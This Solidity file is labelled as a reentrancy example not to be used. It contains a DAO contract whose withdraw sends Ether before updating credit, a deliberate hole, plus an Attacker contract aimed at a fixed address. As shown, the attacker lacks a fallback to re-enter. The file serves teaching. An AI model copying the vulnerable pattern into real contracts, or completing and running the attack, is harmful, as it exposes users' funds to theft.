// This is a example of reentrancy fail, dont use this code

pragma solidity 0.4.26;

contract DAO {
 
    mapping (address => uint256) public credit;
    
    function balanceDAO() public view returns(uint256) {
        return(address(this).balance);
    }
 
    function donate(address to) public payable {
        credit[to] += msg.value;
    }
 
    function withdraw(uint amount) public {
        if (credit[msg.sender] >= amount) {
            msg.sender.call.value(amount)();
            credit[msg.sender] -= amount;
        }
    }
}

contract Attacker {
    
    DAO public dao = DAO(0x12D50f790d4B4474909132A5E1047ecD18a745a8);
    address owner;
    
    constructor() public {
        owner = msg.sender;
    }
    
    function attack() public payable {
        dao.withdraw(100);
    }
    
    function balanceAttacker() public view returns(uint256) {
        return(address(this).balance);
    }
    
    function drainFunds() payable public{
        owner.transfer(address(this).balance);
    }
}
